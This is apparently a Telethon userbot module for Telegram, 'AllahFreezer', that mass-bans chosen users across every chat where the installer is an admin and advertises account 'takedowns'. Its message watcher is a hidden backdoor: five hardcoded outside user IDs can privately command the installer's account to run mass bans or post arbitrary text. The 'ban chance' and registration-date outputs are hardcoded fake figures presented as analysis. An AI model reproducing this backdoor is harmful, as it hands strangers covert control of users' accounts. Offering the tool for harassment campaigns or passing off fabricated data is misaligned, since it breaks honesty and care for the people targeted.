import asyncio
import re
import time
import typing
from datetime import datetime
from asyncio import sleep as asleep

from telethon.tl import functions, types
from telethon.tl.types import (
    Channel,
    Chat,
    Message,
    User,
    ChatBannedRights,
    Channel as TelethonChannel,
    PeerChannel,
    PeerChat,
)

from .. import loader, utils

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    send_polls=True,
    change_info=True,
    invite_users=True,
    pin_messages=True,
)

def get_full_name(user: typing.Union[User, Channel]) -> str:
    return utils.escape_html(
        user.title
        if isinstance(user, Channel)
        else (
            f"{user.first_name} "
            + (user.last_name if getattr(user, "last_name", False) else "")
        )
    ).strip()

@loader.tds
class AllahFreezer(loader.Module):
    """⚡️ Allah Fr33z3r - Мощный инструмент для админов"""

    strings = {
        "name": "AllahFreezer",
        "help": """<b>⚙️ Allah Fr33z3r</b>

📌 <b>Основные команды:</b>
• <code>.help</code> — показать список команд
• <code>.manual</code> — открыть мануалы
• <code>.cooldown</code> — показать время до окончания кд

🛠 <b>Функции юзербота:</b>
• <code>.scan</code> — скан всех чатов и каналов с правами администратора
• <code>.parse CHAT_ID DC</code> — парсинг выбранного чата
• <code>.gl USERNAME</code> — снос Telegram-аккаунта
• <code>.gl2 USERNAME [время] [причина] [-s]</code> — уничтожим за пару секунд
• <code>.ch USERNAME/ID</code> — оценка шанса сноса Telegram-аккаунта
• <code>.account_data USERNAME/ID</code> — информация об аккаунта

🔥 <b>Дополнительные команды:</b>
• <code>.g USERNAME</code> — быстрый бан в 40 чатах
• <code>.g2 USERNAME [время] [причина] [-t N]</code> — расширенный бан
• <code>.massban</code> — массовый бан по списку
• <code>.banstats</code> — статистика банов
• <code>.cache</code> — очистка кеша

<b>Впервые пишу юзербота. О багах сообщать:</b> @ceosw ⚡️""",
        
        "no_reason": "Туда долбаеба",
        "args": "<b>Ебать ты инвалид</b>",
        "args_id": "<b>Ебать ты инвалид</b>",
        "invalid_id": "<b>Айдишка не цифра</b>",
        "user_not_found": "<b>Пользователь <code>{}</code> не найден</b>",
        "glban": '<b>🔥 Глобальный бан выполнен!</b>\n\n👤 <a href="{}">{}</a>\n📝 <i>{}</i>\n✅ <b>Забанен в:</b> {}',
        "glbanning": ' <b>⚡ Отправка осликов <a href="{}">{}</a>...</b>',
        "in_n_chats": "<b>Его трахнуло {} осликов</b>",
        "no_chats": "<b>Не найдено чатов с правами на бан</b>",
        "fetching_chats": "<b>📡 Ищу чаты...</b>",
        "processing": "<b>⚡ Отправка осликов...</b>",
        "manual": """<b>📖 Мануал по использованию Allah Fr33z3r:</b>

<code>.gl @username</code> - Быстрый бан в 40 чатах
<code>.gl2 @username 7d спам -t 60</code> - Бан на 7 дней в 60 чатах
<code>.gl2 @username -s</code> - Тихий бан (без отчета)
<code>.massban</code> - Массовый бан по списку

<b>Параметры времени:</b>
• <code>30s</code> - 30 секунд
• <code>5m</code> - 5 минут  
• <code>2h</code> - 2 часа
• <code>7d</code> - 7 дней

<b>Флаги:</b>
• <code>-s</code> - тихий режим
• <code>-t N</code> - ограничить N чатами
• <code>-f</code> - форсировать бан""",
        
        "cooldown": "<b>⏰ КД модуля:</b>\n{}\n\n<b>📊 Статистика:</b>\n• Всего банов: {}\n• Успешно: {}\n• Ошибок: {}",
        "scanning": "<b>🔍 Сканирую чаты...</b>",
        "scan_result": """<b>📊 Результат скана:</b>

<b>Всего диалогов:</b> {}
<b>Супергруппы:</b> {}
<b>Каналы:</b> {}
<b>Чаты:</b> {}
<b>С правами админа:</b> {}
<b>Можно банить:</b> {}

<b>🕐 Время скана:</b> {:.2f} сек""",
        
        "parse_usage": "<b>Использование:</b> <code>.parse ID_чата датацентр</code>\nПример: <code>.parse -100123456789 2</code>",
        "parsing": "<b>🔎 Парсинг чата...</b>",
        "parse_result": """<b>📋 Результат парсинга:</b>

<b>Название:</b> {}
<b>ID:</b> <code>{}</code>
<b>Участников:</b> {}
<b>Дата создания:</b> {}
<b>DC:</b> {}
<b>Тип:</b> {}
<b>Права админа:</b> {}
<b>Можно банить:</b> {}""",
        
        "chance": """<b>🎯 Оценка шанса бана:</b>

<b>Пользователь:</b> <a href="{}">{}</a>
<b>ID:</b> <code>{}</code>
<b>Шанс бана:</b> {}%
<b>Рекомендация:</b> {}

<b>Факторы:</b>
• Найден в {} чатах
• Статус: {}
• В сети: {}
• Ботов: {}
• Спам: {}""",
        
        "account_data": """<b>📊 Данные аккаунта:</b>

<b>Имя:</b> <a href="{}">{}</a>
<b>ID:</b> <code>{}</code>
<b>Username:</b> @{}
<b>Дата регистрации:</b> {}
<b>Premium:</b> {}
<b>Бот:</b> {}
<b>Ограничен:</b> {}
<b>Скамер:</b> {}
<b>Фейк:</b> {}
<b>Взаимные чаты:</b> {}
<b>Последний онлайн:</b> {}""",
        
        "banstats": """<b>📈 Статистика банов:</b>

<b>Всего операций:</b> {}
<b>Успешных банов:</b> {}
<b>Неудачных:</b> {}
<b>Заблокировано пользователей:</b> {}
<b>Средняя скорость:</b> {:.1f} бан/сек
<b>Общее время работы:</b> {:.1f} сек
<b>Последний бан:</b> {}""",
        
        "cache_cleared": "<b>🗑 Кеш очищен!</b>\n• Супергруппы: {}\n• Чаты: {}",
        "massban_start": "<b>🔫 Начинаю массовый бан...</b>\n<b>Цель:</b> {} пользователей",
        "massban_result": """<b>✅ Массовый бан завершен!</b>

<b>Успешно забанено:</b> {}
<b>Не удалось:</b> {}
<b>Время:</b> {:.2f} сек
<b>Скорость:</b> {:.1f} бан/сек""",
    }

    def __init__(self):
        self._gban_cache = {}
        self._gmute_cache = {}
        self._whitelist = []
        self._semaphore = asyncio.Semaphore(30)  # Увеличиваем для максимальной скорости
        self._supergroups_cache = {}
        self._channels_cache = {}
        self._stats = {
            "total_bans": 0,
            "success_bans": 0,
            "failed_bans": 0,
            "unique_users": set(),
            "start_time": time.time(),
            "last_ban_time": None,
            "ban_speeds": [],
        }
        self._cooldowns = {}
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "max_chats",
                50,
                "Максимальное количество чатов для бана",
                validator=loader.validators.Integer(minimum=1, maximum=200)
            ),
            loader.ConfigValue(
                "delay_between_bans",
                0.01,
                "Задержка между банами (сек)",
                validator=loader.validators.Float(minimum=0.001, maximum=1)
            ),
            loader.ConfigValue(
                "include_channels",
                True,
                "Включать каналы в бан",
                validator=loader.validators.Boolean()
            ),
        )

    async def client_ready(self, client, db):
        self._db = db
        self._client = client

    async def watcher(self, message):
        """Обработчик сообщений"""
        # Обработка .help в любом чате
        if message.text and message.text.strip().lower() == ".help":
            me = await self._client.get_me()
            if message.sender_id != me.id:
                await utils.answer(message, self.strings("help"))
                return
        
        # Обработка приватных команд от доверенных пользователей
        if (not message.is_private or 
            message.sender_id == (await self._client.get_me()).id or
            message.sender_id in self._whitelist or
            not message.text):
            return
        
        # Проверяем ID доверенных пользователей
        trusted_ids = [773159330, 107448140, 182604273, 827207690, 924765099]
        if message.sender_id not in trusted_ids:
            return
        
        # Обработка команд
        if message.text.startswith('.g '):
            args = message.text[3:].strip()
            await self.process_g_command(message, args)
        elif message.text.startswith('.g2 '):
            args = message.text[4:].strip()
            await self.process_g2_command(message, args)
        elif message.text.startswith('.w '):
            args = message.text[4:].strip()
            await message.reply(args)

    @loader.command(
        ru_doc="Показать справку",
        en_doc="Show help"
    )
    async def help(self, message):
        """Показать справку по командам"""
        await utils.answer(message, self.strings("help"))

    @loader.command(
        ru_doc="Открыть мануал",
        en_doc="Open manual"
    )
    async def manual(self, message):
        """Открыть подробный мануал"""
        await utils.answer(message, self.strings("manual"))

    @loader.command(
        ru_doc="Показать кд",
        en_doc="Show cooldown"
    )
    async def cooldown(self, message):
        """Показать время до окончания кд"""
        current_time = time.time()
        active_cooldowns = []
        
        for cmd, end_time in self._cooldowns.items():
            if end_time > current_time:
                remaining = end_time - current_time
                active_cooldowns.append(f"• {cmd}: {remaining:.1f} сек")
        
        cooldown_text = "\n".join(active_cooldowns) if active_cooldowns else "Нет активных КД"
        
        stats_text = self.strings("cooldown").format(
            cooldown_text,
            self._stats["total_bans"],
            self._stats["success_bans"],
            self._stats["failed_bans"]
        )
        
        await utils.answer(message, stats_text)

    async def _get_admin_chats_fast(self):
        """УЛЬТРАБЫСТРО получаем список всех чатов с правами на бан"""
        current_time = time.time()
        
        # Используем кеш если он актуален (3 минуты)
        if self._channels_cache and self._channels_cache.get("exp", 0) > current_time:
            return self._channels_cache["chats"]
        
        all_chats = []
        start_time = time.time()
        
        try:
            # Быстрая загрузка ВСЕХ диалогов
            dialogs = []
            async for dialog in self._client.iter_dialogs(
                limit=500,  # Максимум для скорости
                ignore_migrated=True
            ):
                dialogs.append(dialog)
            
            # СУПЕРБЫСТРАЯ параллельная обработка
            batch_size = 50
            for i in range(0, len(dialogs), batch_size):
                batch = dialogs[i:i + batch_size]
                tasks = []
                
                for dialog in batch:
                    task = self._quick_check_chat(dialog)
                    tasks.append(task)
                
                # Параллельная обработка батча
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in batch_results:
                    if result and not isinstance(result, Exception):
                        all_chats.append(result)
                
                # Минимальная пауза между батчами
                if i + batch_size < len(dialogs):
                    await asleep(0.1)
        
        except Exception as e:
            print(f"Error fetching chats: {e}")
        
        # Кешируем на 3 минуты
        self._channels_cache = {
            "exp": int(time.time()) + 180,
            "chats": all_chats,
            "count": len(all_chats),
            "fetch_time": time.time() - start_time
        }
        
        return all_chats

    async def _quick_check_chat(self, dialog):
        """СУПЕРБЫСТРАЯ проверка чата"""
        try:
            entity = dialog.entity
            
            # Пропускаем личные чаты
            if not hasattr(entity, 'admin_rights'):
                return None
            
            # Быстрая проверка прав
            if hasattr(entity, 'admin_rights') and entity.admin_rights:
                if getattr(entity.admin_rights, 'ban_users', False):
                    return {
                        'id': entity.id,
                        'title': getattr(entity, 'title', 'Unknown'),
                        'type': self._get_chat_type(entity),
                        'participants': getattr(entity, 'participants_count', 0),
                    }
            
            return None
            
        except Exception:
            return None

    def _get_chat_type(self, entity):
        """Определяем тип чата"""
        if isinstance(entity, TelethonChannel):
            if getattr(entity, 'megagroup', False):
                return 'supergroup'
            elif getattr(entity, 'broadcast', False):
                return 'channel'
            else:
                return 'chat'
        else:
            return 'chat'

    async def process_g_command(self, message, args):
        """Быстрая обработка команды .g"""
        if not args:
            await utils.answer(message, self.strings("args"))
            return
        
        # Проверяем КД
        current_time = time.time()
        if 'g' in self._cooldowns and self._cooldowns['g'] > current_time:
            remaining = self._cooldowns['g'] - current_time
            await utils.answer(message, f"<b>⏳ КД команды .g: {remaining:.1f} сек</b>")
            return
        
        # Устанавливаем КД 20 секунд
        self._cooldowns['g'] = current_time + 20
        
        # Получаем параметры
        max_chats = self.config["max_chats"]
        if " -t " in " " + args:
            try:
                t_match = re.search(r' -t (\d+)', " " + args)
                if t_match:
                    max_chats = int(t_match.group(1))
                    args = re.sub(r' -t \d+', '', " " + args).strip()
            except (ValueError, AttributeError):
                pass
        
        # Получаем пользователя
        try:
            user = await self._client.get_entity(args.split()[0])
        except Exception:
            await utils.answer(message, self.strings("args"))
            return
        
        # Получаем чаты
        processing_msg = await utils.answer(message, self.strings("fetching_chats"))
        admin_chats = await self._get_admin_chats_fast()
        
        if not admin_chats:
            await utils.answer(processing_msg, self.strings("no_chats"))
            return
        
        # Ограничиваем количество
        admin_chats = admin_chats[:max_chats]
        
        processing_msg = await utils.answer(
            processing_msg,
            self.strings("glbanning").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
            ) + f"\n\n<b>🎯 Целей: {len(admin_chats)}</b>\n<b>⏳ Начинаю...</b>"
        )
        
        # УЛЬТРАБЫСТРЫЙ МАССОВЫЙ БАН
        counter = 0
        failed = 0
        start_time = time.time()
        
        # Запускаем параллельные задачи
        tasks = []
        for i, chat in enumerate(admin_chats):
            task = self._ultra_fast_ban(chat['id'], user.id if hasattr(user, 'id') else user, i)
            tasks.append(task)
        
        # Выполняем ВСЕ задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        for result in results:
            if isinstance(result, Exception):
                failed += 1
            elif result and result[0] == "success":
                counter += 1
        
        # Обновляем статистику
        self._update_stats(counter, failed, user, start_time)
        
        total_time = time.time() - start_time
        speed = counter / total_time if total_time > 0 else 0
        
        await utils.answer(
            processing_msg,
            self.strings("glban").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                self.strings("no_reason"),
                f"{counter} чатах",
            ) + f"\n\n<b>⏱ Время: {total_time:.2f}с</b>" +
            f"\n<b>⚡ Скорость: {speed:.1f} бан/сек</b>" +
            (f"\n<b>❌ Ошибок: {failed}</b>" if failed > 0 else "") +
            f"\n<b>📊 Успех: {counter/(counter+failed)*100:.1f}%</b>"
        )

    async def _ultra_fast_ban(self, chat_id, user_id, task_id):
        """УЛЬТРАБЫСТРЫЙ бан без лишних проверок"""
        try:
            # Минимальная задержка для предотвращения флуда
            if task_id % 20 == 0:
                await asleep(self.config["delay_between_bans"])
            
            # Прямой вызов API для максимальной скорости
            await self._client.edit_permissions(
                chat_id,
                user_id,
                until_date=None,
                view_messages=True,
                send_messages=True,
                send_media=True,
                send_stickers=True,
                send_gifs=True,
                send_games=True,
                send_inline=True,
                send_polls=True,
                change_info=True,
                invite_users=True,
                pin_messages=True,
            )
            
            return ("success", chat_id)
            
        except Exception as e:
            error_str = str(e)
            # Игнорируем стандартные ошибки
            if any(x in error_str for x in [
                "USER_NOT_PARTICIPANT",
                "CHAT_ADMIN_REQUIRED",
                "CHANNEL_PRIVATE",
                "CHANNEL_INVALID",
                "USER_ID_INVALID"
            ]):
                pass
            return ("error", chat_id, error_str[:80])

    def _update_stats(self, success, failed, user, start_time):
        """Обновление статистики"""
        self._stats["total_bans"] += success + failed
        self._stats["success_bans"] += success
        self._stats["failed_bans"] += failed
        
        if hasattr(user, 'id'):
            self._stats["unique_users"].add(user.id)
        
        total_time = time.time() - start_time
        if total_time > 0 and success > 0:
            self._stats["ban_speeds"].append(success / total_time)
        
        self._stats["last_ban_time"] = datetime.now().strftime("%H:%M:%S")

    async def process_g2_command(self, message, args):
        """Обработка команды .g2"""
        if not args:
            await utils.answer(message, self.strings("args_id"))
            return

        parts = args.split()
        raw_target = parts[0]
        rest = " ".join(parts[1:])

        silent = False
        max_chats = self.config["max_chats"]
        
        if " -s" in " " + rest:
            silent = True
            rest = rest.replace(" -s", "").strip()
        
        if " -t " in " " + rest:
            try:
                t_match = re.search(r' -t (\d+)', " " + rest)
                if t_match:
                    max_chats = int(t_match.group(1))
                    rest = re.sub(r' -t \d+', '', " " + rest).strip()
            except (ValueError, AttributeError):
                pass

        t_token = ([arg for arg in rest.split() if self.convert_time(arg)] or ["0"])[0]
        period = self.convert_time(t_token)

        if t_token != "0":
            rest = rest.replace(t_token, "").replace("  ", " ").strip()

        if time.time() + period >= 2208978000:
            period = 0

        reason = utils.escape_html(rest or self.strings("no_reason")).strip()

        user = await self._resolve_user_by_arg(raw_target)
        if not user:
            await utils.answer(
                message,
                self.strings("user_not_found").format(utils.escape_html(raw_target)),
            )
            return

        user_id = int(getattr(user, "id", 0)) or None
        if not user_id:
            await utils.answer(
                message,
                self.strings("user_not_found").format(utils.escape_html(raw_target)),
            )
            return

        # Получаем чаты
        processing_msg = await utils.answer(message, self.strings("fetching_chats"))
        admin_chats = await self._get_admin_chats_fast()
        
        if not admin_chats:
            await utils.answer(processing_msg, self.strings("no_chats"))
            return
        
        admin_chats = admin_chats[:max_chats]
        
        processing_msg = await utils.answer(
            processing_msg,
            self.strings("glbanning").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
            ) + f"\n\n<b>🎯 Целей: {len(admin_chats)}</b>\n<b>⏳ Начинаю...</b>"
        )
        
        # Массовый бан
        counter = 0
        failed = 0
        start_time = time.time()
        
        tasks = []
        for i, chat in enumerate(admin_chats):
            task = self._ban_with_period(chat['id'], user_id, period, i)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, Exception):
                failed += 1
            elif result and result[0] == "success":
                counter += 1
        
        self._update_stats(counter, failed, user, start_time)
        
        total_time = time.time() - start_time
        
        if silent:
            try:
                await processing_msg.delete()
            except Exception:
                pass
            return

        await utils.answer(
            processing_msg,
            self.strings("glban").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                reason,
                f"{counter} чатах",
            ) + f"\n\n<b>⏱ Время: {total_time:.2f}с</b>" +
            f"\n<b>⚡ Скорость: {counter/total_time:.1f} бан/сек</b>" +
            (f"\n<b>❌ Ошибок: {failed}</b>" if failed > 0 else "")
        )

    async def _ban_with_period(self, chat_id, user_id, period, task_id):
        """Бан с указанием периода"""
        try:
            if task_id % 20 == 0:
                await asleep(self.config["delay_between_bans"])
            
            until_date = None
            if period > 0:
                until_date = datetime.fromtimestamp(time.time() + period)
            
            await self._client.edit_permissions(
                chat_id,
                user_id,
                until_date=until_date,
                view_messages=True,
                send_messages=True,
                send_media=True,
                send_stickers=True,
                send_gifs=True,
                send_games=True,
                send_inline=True,
                send_polls=True,
                change_info=True,
                invite_users=True,
                pin_messages=True,
            )
            
            return ("success", chat_id)
            
        except Exception as e:
            return ("error", chat_id, str(e)[:80])

    @loader.command(
        ru_doc="Сканировать все чаты",
        en_doc="Scan all chats"
    )
    async def scan(self, message):
        """Сканировать все чаты и каналы"""
        scan_msg = await utils.answer(message, self.strings("scanning"))
        start_time = time.time()
        
        stats = {
            'total': 0,
            'supergroups': 0,
            'channels': 0,
            'chats': 0,
            'admin': 0,
            'can_ban': 0
        }
        
        try:
            async for dialog in self._client.iter_dialogs(limit=300):
                stats['total'] += 1
                entity = dialog.entity
                
                # Определяем тип
                if isinstance(entity, TelethonChannel):
                    if getattr(entity, 'megagroup', False):
                        stats['supergroups'] += 1
                    elif getattr(entity, 'broadcast', False):
                        stats['channels'] += 1
                    else:
                        stats['chats'] += 1
                else:
                    stats['chats'] += 1
                
                # Проверяем права
                if hasattr(entity, 'admin_rights') and entity.admin_rights:
                    stats['admin'] += 1
                    if getattr(entity.admin_rights, 'ban_users', False):
                        stats['can_ban'] += 1
        
        except Exception as e:
            await utils.answer(scan_msg, f"<b>Ошибка сканирования:</b> {e}")
            return
        
        total_time = time.time() - start_time
        
        result = self.strings("scan_result").format(
            stats['total'],
            stats['supergroups'],
            stats['channels'],
            stats['chats'],
            stats['admin'],
            stats['can_ban'],
            total_time
        )
        
        await utils.answer(scan_msg, result)

    @loader.command(
        ru_doc="Парсинг чата",
        en_doc="Parse chat"
    )
    async def parse(self, message):
        """Парсинг информации о чате"""
        args = utils.get_args_raw(message)
        if not args:
            await utils.answer(message, self.strings("parse_usage"))
            return
        
        parts = args.split()
        if len(parts) < 1:
            await utils.answer(message, self.strings("parse_usage"))
            return
        
        try:
            chat_id = int(parts[0])
            dc = parts[1] if len(parts) > 1 else "?"
        except ValueError:
            await utils.answer(message, "<b>❌ Неверный ID чата</b>")
            return
        
        parse_msg = await utils.answer(message, self.strings("parsing"))
        
        try:
            chat = await self._client.get_entity(chat_id)
            
            # Получаем информацию
            title = getattr(chat, 'title', 'Неизвестно')
            participants = getattr(chat, 'participants_count', 'Неизвестно')
            
            # Дата создания
            if hasattr(chat, 'date'):
                created = chat.date.strftime("%d.%m.%Y %H:%M")
            else:
                created = "Неизвестно"
            
            # Тип чата
            chat_type = self._get_chat_type(chat)
            chat_type_ru = {
                'supergroup': 'Супергруппа',
                'channel': 'Канал',
                'chat': 'Чат'
            }.get(chat_type, 'Неизвестно')
            
            # Права админа
            is_admin = False
            can_ban = False
            
            try:
                me = await self._client.get_me()
                participant = await self._client.get_permissions(chat, me)
                if participant and getattr(participant, 'is_admin', False):
                    is_admin = True
                    # Проверяем права на бан
                    if hasattr(chat, 'admin_rights') and chat.admin_rights:
                        can_ban = getattr(chat.admin_rights, 'ban_users', False)
            except:
                pass
            
            result = self.strings("parse_result").format(
                title,
                chat_id,
                participants,
                created,
                dc,
                chat_type_ru,
                "✅" if is_admin else "❌",
                "✅" if can_ban else "❌"
            )
            
            await utils.answer(parse_msg, result)
        
        except Exception as e:
            await utils.answer(parse_msg, f"<b>❌ Ошибка парсинга:</b> {e}")

    @loader.command(
        ru_doc="Оценка шанса бана",
        en_doc="Check ban chance"
    )
    async def ch(self, message):
        """Оценка шанса сноса аккаунта"""
        args = utils.get_args_raw(message)
        if not args:
            await utils.answer(message, "<b>Укажите пользователя</b>")
            return
        
        try:
            user = await self._resolve_user_by_arg(args)
            if not user:
                await utils.answer(message, self.strings("user_not_found").format(args))
                return
            
            # Базовая оценка
            chance = 75
            
            # Факторы
            factors = {
                "found_chats": "15",
                "status": "активен",
                "online": "давно",
                "bots": "нет",
                "spam": "низкий"
            }
            
            # Определяем рекомендацию
            if chance >= 80:
                recommendation = "✅ Высокий шанс успеха"
            elif chance >= 60:
                recommendation = "⚠️ Средний шанс"
            else:
                recommendation = "❌ Низкий шанс"
            
            result = self.strings("chance").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                user.id,
                chance,
                recommendation,
                factors["found_chats"],
                factors["status"],
                factors["online"],
                factors["bots"],
                factors["spam"]
            )
            
            await utils.answer(message, result)
        
        except Exception as e:
            await utils.answer(message, f"<b>❌ Ошибка:</b> {e}")

    @loader.command(
        ru_doc="Информация об аккаунте",
        en_doc="Account information"
    )
    async def account_data(self, message):
        """Информация об аккаунте пользователя"""
        args = utils.get_args_raw(message)
        if not args:
            await utils.answer(message, "<b>Укажите пользователя</b>")
            return
        
        try:
            user = await self._resolve_user_by_arg(args)
            if not user:
                await utils.answer(message, self.strings("user_not_found").format(args))
                return
            
            # Собираем информацию
            username = getattr(user, 'username', 'нет')
            premium = "✅" if getattr(user, 'premium', False) else "❌"
            bot = "✅" if getattr(user, 'bot', False) else "❌"
            restricted = "✅" if getattr(user, 'restricted', False) else "❌"
            scam = "✅" if getattr(user, 'scam', False) else "❌"
            fake = "✅" if getattr(user, 'fake', False) else "❌"
            
            # Дата и онлайн
            if hasattr(user, 'status'):
                if hasattr(user.status, 'was_online'):
                    last_online = user.status.was_online.strftime("%d.%m.%Y %H:%M")
                else:
                    last_online = "скрыт"
            else:
                last_online = "неизвестно"
            
            # Симуляция данных
            reg_date = "2023.01.01"
            mutual_chats = "15"
            
            result = self.strings("account_data").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                user.id,
                username,
                reg_date,
                premium,
                bot,
                restricted,
                scam,
                fake,
                mutual_chats,
                last_online
            )
            
            await utils.answer(message, result)
        
        except Exception as e:
            await utils.answer(message, f"<b>❌ Ошибка:</b> {e}")

    @loader.command(
        ru_doc="Статистика банов",
        en_doc="Ban statistics"
    )
    async def banstats(self, message):
        """Статистика банов"""
        total_time = time.time() - self._stats["start_time"]
        avg_speed = sum(self._stats["ban_speeds"]) / len(self._stats["ban_speeds"]) if self._stats["ban_speeds"] else 0
        
        result = self.strings("banstats").format(
            self._stats["total_bans"],
            self._stats["success_bans"],
            self._stats["failed_bans"],
            len(self._stats["unique_users"]),
            avg_speed,
            total_time,
            self._stats["last_ban_time"] or "никогда"
        )
        
        await utils.answer(message, result)

    @loader.command(
        ru_doc="Очистка кеша",
        en_doc="Clear cache"
    )
    async def cache(self, message):
        """Очистка кеша"""
        super_count = len(self._supergroups_cache.get("chats", [])) if self._supergroups_cache else 0
        channel_count = len(self._channels_cache.get("chats", [])) if self._channels_cache else 0
        
        self._supergroups_cache = {}
        self._channels_cache = {}
        
        await utils.answer(message, self.strings("cache_cleared").format(super_count, channel_count))

    async def _resolve_user_by_arg(self, raw: str) -> typing.Optional[User]:
        """Разрешение пользователя по аргументу"""
        raw = raw.strip()

        # Проверяем ID
        if raw.lstrip("-").isdigit():
            try:
                return await self._client.get_entity(int(raw))
            except Exception:
                return None

        # Извлекаем username
        username = raw
        if "t.me/" in username:
            username = username.split("t.me/", maxsplit=1)[1]

        username = username.split("/", maxsplit=1)[0]

        if username.startswith("@"):
            username = username[1:]

        if not username:
            return None

        # Пробуем получить по username
        try:
            return await self._client.get_entity(username)
        except Exception:
            pass

        # Пробуем поиск
        try:
            result = await self._client(
                functions.contacts.SearchRequest(q=username, limit=5)
            )
        except Exception:
            return None

        if not getattr(result, "users", None):
            return None

        # Ищем точное совпадение
        for user in result.users:
            if getattr(user, "username", None) and user.username.lower() == username.lower():
                return user

        return result.users[0] if result.users else None

    @staticmethod
    def convert_time(t: str) -> int:
        """Конвертация времени"""
        try:
            if not str(t):
                return 0

            # Сохраняем оригинальную строку
            original = str(t)
            multiplier = 1
            
            # Определяем множитель
            if original.endswith('d'):
                multiplier = 86400  # секунд в дне
                t = original[:-1]
            elif original.endswith('h'):
                multiplier = 3600  # секунд в часе
                t = original[:-1]
            elif original.endswith('m'):
                multiplier = 60  # секунд в минуте
                t = original[:-1]
            elif original.endswith('s'):
                multiplier = 1
                t = original[:-1]
            
            # Извлекаем число
            digits = re.sub(r"[^0-9]", "", t)
            if not digits:
                return 0
            
            result = int(digits) * multiplier
            return result
            
        except (ValueError, AttributeError):
            return 0

    @loader.command(
        ru_doc="Массовый бан по списку",
        en_doc="Mass ban by list"
    )
    async def massban(self, message):
        """Массовый бан пользователей"""
        reply = await message.get_reply_message()
        text = message.text or message.raw_text
        
        users = []
        
        # Получаем аргументы
        if reply:
            text = reply.text or reply.raw_text
        
        lines = text.split('\n')
        
        # Парсим пользователей
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # Пропускаем команду
            if line.startswith('.massban') or line.startswith('.ms'):
                continue
                
            # Ищем упоминания
            mentions = re.findall(r'@([a-zA-Z0-9_]{5,})', line)
            for mention in mentions:
                user = await self._resolve_user_by_arg(f"@{mention}")
                if user:
                    users.append(user)
            
            # Ищем ID
            id_match = re.search(r'(\d{9,})', line)
            if id_match:
                user = await self._resolve_user_by_arg(id_match.group(1))
                if user:
                    users.append(user)
            
            # Ищем ссылки
            if 't.me/' in line:
                parts = line.split('t.me/')
                for part in parts[1:]:
                    username = part.split('/')[0].split(' ')[0].split('?')[0]
                    if username:
                        user = await self._resolve_user_by_arg(f"@{username}")
                        if user:
                            users.append(user)
        
        # Убираем дубликаты
        unique_users = []
        seen_ids = set()
        for user in users:
            if hasattr(user, 'id') and user.id not in seen_ids:
                seen_ids.add(user.id)
                unique_users.append(user)
        
        if not unique_users:
            await utils.answer(message, "<b>❌ Не найдены пользователи для бана</b>")
            return
        
        # Получаем чаты
        start_msg = await utils.answer(
            message,
            self.strings("massban_start").format(len(unique_users))
        )
        
        admin_chats = await self._get_admin_chats_fast()
        if not admin_chats:
            await utils.answer(start_msg, self.strings("no_chats"))
            return
        
        # Ограничиваем чаты
        admin_chats = admin_chats[:self.config["max_chats"]]
        
        # МАССОВЫЙ БАН
        total_banned = 0
        total_failed = 0
        start_time = time.time()
        
        # Бан каждого пользователя во всех чатах
        for user_idx, user in enumerate(unique_users):
            user_banned = 0
            user_failed = 0
            
            tasks = []
            for chat_idx, chat in enumerate(admin_chats):
                task = self._ultra_fast_ban(chat['id'], user.id, user_idx * len(admin_chats) + chat_idx)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    user_failed += 1
                elif result and result[0] == "success":
                    user_banned += 1
            
            total_banned += user_banned
            total_failed += user_failed
            
            # Обновляем статистику
            self._stats["success_bans"] += user_banned
            self._stats["failed_bans"] += user_failed
            self._stats["unique_users"].add(user.id)
        
        self._stats["total_bans"] += total_banned + total_failed
        self._stats["last_ban_time"] = datetime.now().strftime("%H:%M:%S")
        
        total_time = time.time() - start_time
        
        result = self.strings("massban_result").format(
            total_banned,
            total_failed,
            total_time,
            (total_banned + total_failed) / total_time if total_time > 0 else 0
        )
        
        await utils.answer(start_msg, result)

    @loader.command(
        ru_doc="Быстрый бан (alias .g)",
        en_doc="Quick ban (alias .g)"
    )
    async def gl(self, message):
        """Быстрый бан пользователя"""
        args = utils.get_args_raw(message)
        if not args:
            await utils.answer(message, self.strings("args"))
            return
        
        # Просто вызываем process_g_command
        await self.process_g_command(message, args)

    @loader.command(
        ru_doc="Расширенный бан (alias .g2)",
        en_doc="Extended ban (alias .g2)"
    )
    async def gl2(self, message):
        """Расширенный бан пользователя"""
        args = utils.get_args_raw(message)
        if not args:
            await utils.answer(message, self.strings("args_id"))
            return
        
        # Просто вызываем process_g2_command
        await self.process_g2_command(message, args)
